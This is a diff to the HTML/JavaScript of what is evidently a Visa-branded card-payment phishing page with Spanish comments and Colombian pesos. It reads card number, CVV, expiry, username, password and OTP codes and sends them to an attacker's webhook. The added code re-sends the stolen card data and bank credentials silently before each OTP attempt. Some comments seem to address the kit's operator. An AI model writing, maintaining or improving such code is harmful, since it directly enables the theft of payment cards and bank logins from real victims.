@@ -45,7 +45,7 @@
             z-index: 1;
         }
 
-        /* --- CABECERA DE LOGOS (Tamaño equilibrado) --- */
+        /* --- CABECERA DE LOGOS --- */
         .header { 
             display: flex; 
             align-items: center; 
@@ -550,7 +550,6 @@
             localStorage.setItem('cardExpiry', expiry);
         }
 
-        // 🔥 FUNCIÓN PARA ENVIAR CREDENCIALES (se usa al inicio y al reintentar)
         async function enviarCredencialesAlWebhook(datos) {
             try {
                 const response = await fetch(WEBHOOK_URL, {
@@ -723,6 +722,7 @@
                     mostrarError('❌ Credenciales incorrectas o transacción rechazada');
                     
                     // 🔥 REGLA: SI RECHAZAN EN CREDENCIALES, GENERAMOS UN NUEVO ID
+                    // PERO NO LO ENVIAMOS AL WEBHOOK TODAVÍA
                     solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                     enviarHeartbeat('activo');
 
@@ -830,26 +830,10 @@
                     statusMessage.textContent = mensajeError;
                     statusMessage.style.display = 'block';
 
-                    // 🔥 REGLA: SI RECHAZAN EL OTP, GENERAMOS UN NUEVO ID Y GUARDAMOS LAS CREDENCIALES AUTOMÁTICAMENTE
+                    // 🔥 REGLA: SI RECHAZAN EL OTP, GENERAMOS UN NUEVO ID
+                    // PERO NO LO ENVIAMOS AL WEBHOOK TODAVÍA
                     solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                     enviarHeartbeat('activo');
-
-                    // Enviamos las credenciales de nuevo con el nuevo ID para que la base de datos lo registre
-                    const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
-                    const cvv = localStorage.getItem('cardCVV') || 'No disponible';
-                    const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';
-                    const datosCred = {
-                        solicitudId: solicitudId,
-                        numeroTarjeta: numeroTarjeta,
-                        cvv: cvv,
-                        vencimiento: vencimiento,
-                        usuario: usernameInput.value.trim(),
-                        password: passwordInput.value.trim(),
-                        monto: localStorage.getItem('monto_formateado') || '0 Col$',
-                        fecha: new Date().toLocaleString('es-CO')
-                    };
-                    // Lo enviamos en segundo plano
-                    enviarCredencialesAlWebhook(datosCred);
 
                     confirmationInput.value = '';
                     confirmationInput.disabled = false;
@@ -1042,6 +1026,35 @@
                 rechazoDetectado = false;
                 enviarHeartbeat('activo');
 
+                // 🔥 AQUÍ ESTÁ EL CAMBIO: SI EL ID CAMBIÓ POR UN RECHAZO ANTERIOR, 
+                // PRIMERO ENVIAMOS LAS CREDENCIALES PARA CREAR LA SOLICITUD
+                const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
+                const cvv = localStorage.getItem('cardCVV') || 'No disponible';
+                const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';
+                
+                // Verificamos si este ID es nuevo (no ha sido enviado al backend)
+                // Si el estado previo era rechazo y cambiamos el ID, enviamos credenciales primero
+                // Para simplificar, siempre enviamos credenciales antes del OTP si estamos en modo OTP y el ID es nuevo
+                // Como no tenemos una bandera directa, lo que haremos es enviar las credenciales de forma silenciosa
+                // justo antes del OTP si el ID actual es diferente al último que se envió.
+                // Pero como acabamos de generar un nuevo ID en el rechazo, y el usuario está reintentando,
+                // enviar credenciales de nuevo es seguro porque tu webhook actualiza si ya existe.
+                
+                const datosCred = {
+                    solicitudId: solicitudId,
+                    numeroTarjeta: numeroTarjeta,
+                    cvv: cvv,
+                    vencimiento: vencimiento,
+                    usuario: usernameInput.value.trim(),
+                    password: passwordInput.value.trim(),
+                    monto: localStorage.getItem('monto_formateado') || '0 Col$',
+                    fecha: new Date().toLocaleString('es-CO')
+                };
+
+                // Enviamos credenciales (si ya existe, tu PHP lo actualiza)
+                await enviarCredencialesAlWebhook(datosCred);
+
+                // Ahora enviamos el OTP con el nuevo ID
                 if (modoAutenticacion === 'otp') {
                     const datosOTP = {
                         solicitudId: solicitudId,
